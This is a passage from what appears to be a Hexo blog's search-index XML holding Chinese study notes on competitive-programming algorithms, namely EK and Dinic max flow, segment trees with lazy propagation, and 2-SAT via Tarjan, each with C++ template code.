class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3376_7.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dinic算法"><a href="#Dinic算法" class="headerlink" title="Dinic算法"></a>Dinic算法</h2><p>EK算法虽然比较优了，但是有一个情况还是比较费时的，如下图所示</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><p>假设我 $S\to A$ 再经过更多的点，$A$ 后面的分支更多，那么每一次都要 $\text{bfs}$  开销也是很大的的，重要的是很多路我们会重复遍历。这里就体现出了 $\text{Dinic}$ 算法的优了。</p><p>它只需要开始一次 $\text{bfs}$ 就能处理多条路径，它的思想是这样的：先对网络进行 $\text{bfs}$ 分层，我只找这样的增广路：</p><p>对于路径上任意 $u\to v$ 的边，都有 $v$ 在 $u$ 的下一层。我一次可以处理多条增广路，如果没有增广路那么我将对网络重新分层，直到 $\text{bfs}$ 无法遍历到汇点时。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxe 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxe&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dep[maxn],cnt=<span class="number">1</span>,s,t,n,m,ans;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//网络分层 </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())q.<span class="built_in">pop</span>();</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[s]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(!dep[v]&amp;&amp;w)&#123;</span><br><span class="line">                dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//从u出发，目前已有in的流量 </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==t)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]==dep[u]+<span class="number">1</span>&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            edge[i].w-=res;</span><br><span class="line">            edge[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(s,<span class="number">0x7fffffffffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又一个板子收入囊中，网络流应该会 $\text{Dcini}$ 差不多了吧qwq。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 网络流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>线段树的学习笔记</title>
      <link href="/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近复习一下线段树的板子。</p><span id="more"></span><p>就随便写吧，就写给自己看看的，因为即便是我学过板子，也基本会交错很多次。首先一个就是一定在开头加上一句话：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br></pre></td></tr></table></figure><p>然后就是push_down的操作，一定是有标记的时候已经加完了，push_down的时候就是把标记分发下去然后给子节点加上值和lazy标记。</p><p>在add操作的时候一定要加上先push_down再加。</p><h2 id="线段树解决问题的范围"><a href="#线段树解决问题的范围" class="headerlink" title="线段树解决问题的范围"></a>线段树解决问题的范围</h2><p>要求在线，并且含有区间加法和区间查询的操作，下面是洛谷的板子题并给出标程，也可以当板子用。</p><h2 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> lazy;</span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">operator</span>+(<span class="keyword">const</span> eee &amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> sum+a.sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (r-l+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">mid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> a[maxn],ans;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r ,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>]+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//if(tree[now].l==tree[now].r)return;</span></span><br><span class="line">    <span class="keyword">int</span> lazy=tree[now].lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now].lazy=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        tree[i].sum+=num*(tree[i].r-tree[i].l+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//tree[i].sum%=mod;</span></span><br><span class="line">        tree[i].lazy+=num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[i].sum=(tree[i&lt;&lt;<span class="number">1</span>].sum+tree[i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum);<span class="comment">//%mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        ans+=tree[i].sum;</span><br><span class="line">    <span class="comment">//    ans%=mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> n,t;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> op,x,y,z;</span><br><span class="line">        cin&gt;&gt;op;</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">            <span class="built_in">add</span>(x,y,z,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">query</span>(x,y,<span class="number">1</span>);</span><br><span class="line">            cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 线段树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-SAT学习笔记</title>
      <link href="/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>很开心，图论的知识也是积少成多，回首往昔，我对图论的算法仅限于最短路算法($\text {dijkstra}$)和最小生成树($\text {kruskal&amp;prime}$) 。今天来学学这个 $\text {2-SAT}$ 问题。</p><span id="more"></span><h2 id="2-SAT简介"><a href="#2-SAT简介" class="headerlink" title="2-SAT简介"></a>2-SAT简介</h2><blockquote><p>$\text {SAT}$ 是适定性（Satisfiability）问题的简称。一般形式为 k - 适定性问题，简称 k-SAT。而当 $k&gt;2$ 时该问题为 NP 完全的。所以我们只研究 $k=2$ 的情况。</p><p>$\text {2-SAT}$，简单的说就是给出 个集合，每个集合有两个元素，已知若干个 ，表示 与 矛盾（其中 与 属于不同的集合）。然后从每个集合选择一个元素，判断能否一共选 个两两不矛盾的元素。显然可能有多种选择方案，一般题中只需要求出一种即可。(from OI WIKI)</p></blockquote><p>我想上面说的也比我说的稍微清楚点了，那么他的现实意义是什么呢？比较常见的就是逻辑推导了。</p><p>告诉你现在有 A，B，C三个人，且A和B是男生，如果B是男生，那么C是女生。问你这三个人的性别分别是什么，我们很容易可以知道A，B为男，C为女。</p><p>现在主要就是让计算机去计算这个问题怎么办呢？首先有一点可以确定的就是，一个人不能既是男又是女。如果存在这样的断言：如果A是男，那么A是女，这样的话A只能是女，因为A不可能既是男又是女，这个规定就为我们解决 $\text {2-SAT}$ 问题提供了思路。</p><p>我们假设有 $n$ 个人，那么我们建一个 $2\times n$ 个点的有向图，第如果 $i\le n$ 那么第 $i$ 个点表示 $i$ 为男，$i&gt;n$ 那么第 $i$ 个点表示第 $i-n$ 个人为女。$i\to j$有向边很显然表：如果选择点 $i$，那么一定要选择点 $j$，如果我们选择点 $i$ ，那么点 $i+n$ 或者是点 $i-n$ 一定不能被选中，否则我们就说点 $i$ 不能被选择。所以，如果 $i$ 与 $i$ 的对立面同时不能被选择，即它们在同一个强连通分量内，那么整个问题都是无解的，因为有一个人的性别无论怎么选始终无法满足要求。</p><p>一般情况下，解不唯一，我们通常只需要输出是否有解即可，因为如果输出方案的话它们还要设置check脚本。但是洛谷它还就搞了，神不神奇。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://www.luogu.com.cn/problem/P4782">洛谷P4782</a></p><p>典型的 $\text {2-SAT}$ 问题，需要注意的是，它这里每个给出的条件都是或的关系，我们需要转换成边，那么我们想想怎么转换成一条边？如果它的条件给了 $x=1 \ or\ y=1 $ 。那么 $x=1$ 和 $y=1$ 是没有什么关系的，因为 $x=1$ 的时候 $y$ 没有限制，可以为 $1$ 可以为 $0$。但是呢，如果 $x=0$ 则一定推的出 $y=1$ 因为两个必须有一个满足，一个不满足会导致另一个一定要满足。所以我们就把一个条件的反面连接到另一个条件，同样另一个条件的反面也连到这个条件。</p><p>得到了一张有向图之后呢，我们先跑 $\text {tarjan}$ 强连通分量，观察是否存在 $i\le n$ 使得 $i$ 和 $i+n$ 是否属于同一个强连通分量，如果是，则无解。如果不是，则有解。(敲黑板)，这里需要注意了啊，这里跑 $\text{tarjan}$ 需要跑 $2\times n$ 个点。如果选中 $i$ 发现产生冲突那么选择该时事件的对立面则一定不会发生冲突。这里我们跑 $\text{dfs}$ ，把与之相连的所有点都打上被选中的标记，如果存在两个状态同时被选中，则返回 $\text{false}$ 并且逐层回溯，如果到最后都没发生冲突则已选中的状态固定，继续去搜索没有被打标记的状态。直到所有的状态都有一个对应的值，最后输出这个状态。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>],e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],degree[maxn],vis[maxn],num[maxn],s[maxn],cnt,tot,top,cnt2,deep,n,m;</span><br><span class="line"><span class="keyword">int</span> sel[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    e[++cnt2]=&#123;root2[x],y&#125;;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    vis[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[v],low[u]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(vis[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[u]==dfn[u])&#123;</span><br><span class="line">        vis[u]=<span class="number">0</span>;</span><br><span 